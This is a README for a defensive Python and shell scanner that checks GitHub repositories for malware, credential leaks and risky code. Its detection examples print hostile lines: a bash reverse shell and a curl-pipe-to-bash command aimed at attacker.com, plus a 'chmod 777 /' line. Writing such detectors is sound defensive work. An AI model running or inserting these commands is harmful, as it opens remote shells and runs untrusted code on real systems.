# 🔒 Security Scanner for GitHub Repositories

A comprehensive malware and security vulnerability scanner for evaluating GitHub repositories before integration into your project.

## Overview

This tool suite helps you safely evaluate third-party repositories by scanning for:

- **Malware patterns** - Reverse shells, data exfiltration, command injection
- **Suspicious code** - eval(), exec(), unsafe subprocess calls
- **Credential exposure** - API keys, passwords, tokens in code
- **Vulnerable dependencies** - Known malicious packages
- **Suspicious file types** - Executables, DLLs, suspicious file names
- **Shell script risks** - Unsafe shell patterns and privilege escalation attempts

## Components

### 1. `security_scanner.py` - Python Security Scanner
Performs deep code analysis on Python projects.

**Features:**
- Scans Python files for suspicious patterns
- Analyzes dependencies (requirements.txt, setup.py)
- Checks shell scripts for malicious patterns
- Detects suspicious file names and structures
- Generates severity-categorized reports (Critical, High, Medium, Low, Info)

### 2. `scan_repo.sh` - Repository Scanning Helper
One-command script to clone and scan any GitHub repository.

**Features:**
- Automated repository cloning
- Runs full security analysis
- Provides GitHub repository metadata information
- Cleans up temporary files
- Returns exit codes for automation

## Quick Start

### Method 1: Scan a Remote Repository

```bash
# Make the script executable
chmod +x scan_repo.sh

# Scan fastapi_mcp repository
./scan_repo.sh https://github.com/tadata-org/fastapi_mcp

# Or preserve the cloned directory for manual review
./scan_repo.sh https://github.com/tadata-org/fastapi_mcp scan_only
```

### Method 2: Scan a Local Repository

```bash
python3 security_scanner.py /path/to/repository
```

### Method 3: Use in Your Python Code

```python
from security_scanner import SecurityScanner

scanner = SecurityScanner("/path/to/repo")
is_safe = scanner.run_scan()
summary = scanner.get_summary()

if summary['safe_to_use']:
    print("✅ Safe to integrate")
else:
    print(f"⚠️  Critical issues: {summary['critical']}")
```

## Severity Levels

### 🔴 CRITICAL
- Known malicious packages
- Hardcoded credentials
- Command injection vulnerabilities
- Remote code execution risks

### 🟠 HIGH
- Dangerous shell patterns
- Reverse shell attempts
- Privilege escalation attempts
- Unsafe subprocess calls

### 🟡 MEDIUM
- Suspicious code patterns
- Potential data exfiltration
- Risky imports
- Suspicious file operations

### 🟢 LOW
- Minor concerns
- Code quality issues

### ℹ️ INFO
- Informational findings
- Scanning limitations

## What Gets Detected

### Code-Level Threats
```python
# Command Injection
os.system("user_input")
subprocess.call(cmd, shell=True)

# Remote Code Execution
eval(user_input)
exec(user_input)

# Reverse Shells
socket.socket()
subprocess.Popen("/bin/bash -i")

# Credential Leaks
api_key = "sk-1234567890"
password = "secret123"
```

### Shell Script Threats
```bash
# Reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Data exfiltration
curl http://attacker.com | bash

# Privilege escalation
sudo chmod 777 /
```

### Dependency Threats
- Checks against known malicious packages
- Identifies suspicious dependency patterns
- Flags unusual package naming

## Important Notes

### ✅ What This Tool Covers
- Source code analysis
- Dependency inspection
- Pattern matching for known malicious code
- Structural and filename analysis
- Python and shell script inspection

### ⚠️ Limitations
This is not a replacement for:
- Professional security audits
- Dynamic malware analysis
- Formal penetration testing
- Community security reviews (GitHub Issues/Discussions)
- VirusTotal/similar online scanning

### 🔍 For Complete Due Diligence

Always combine automated scanning with manual review:

1. **GitHub Repository Page**
   - Check number of stars and recent activity
   - Review the Security tab for reported vulnerabilities
   - Check issue history for reported security concerns
   - Verify the maintainers and contributors

2. **Manual Code Review**
   - Read key source files
   - Understand the project architecture
   - Check for suspicious patterns the scanner might miss

3. **Community Resources**
   - Check GitHub Discussions
   - Look for security advisories
   - Review pull requests and code reviews

4. **External Tools**
   - Visit VirusTotal.com
   - Check Snyk.io for vulnerability database
   - Review security updates on CVE databases

## Exit Codes

```
0 = Safe to use (no critical or high severity issues)
1 = Issues found (review recommendations above)
```

## Example Output

```
======================================================================
🔒 SECURITY SCAN REPORT
======================================================================
Repository: /tmp/security_scan_fastapi_mcp_12345

Total Findings: 3

🟠 HIGH (1 issues)
----------------------------------------------------------------------
  file: /tmp/security_scan_fastapi_mcp_12345/src/example.py
  line: 42
  type: reverse_shell
  code: socket.socket(socket.AF_INET, socket.SOCK_STREAM)

🟡 MEDIUM (2 issues)
----------------------------------------------------------------------
  ...

======================================================================
SUMMARY
======================================================================
Critical Issues: 0
High Issues: 1
Medium Issues: 2
Low Issues: 0

⚠️ Review recommended: Issues found
```

## Troubleshooting

### Git not found
```bash
sudo apt-get install git
```

### Python3 not found
```bash
sudo apt-get install python3
```

### Permission denied on scan_repo.sh
```bash
chmod +x scan_repo.sh
```

### Module not found errors
The scanner uses only Python standard library (no external dependencies).

## Security Recommendations

1. **Always scan before integrating** - Make it part of your workflow
2. **Review critical/high findings** - Understand what was flagged
3. **Check the project GitHub page** - Stars, activity, maintainers matter
4. **Keep projects updated** - Regularly update dependencies
5. **Monitor for security advisories** - Subscribe to GitHub security alerts
6. **Use security scanning in CI/CD** - Automate scanning of dependencies

## License

This scanner is provided as a security tool for your protection. Use responsibly.

## Contributing

Found a pattern we should detect? Issues or improvements?
Report or contribute to the security scanner.

---

**Remember:** Security is a process, not a destination. Use this tool as one part of a comprehensive security review strategy.
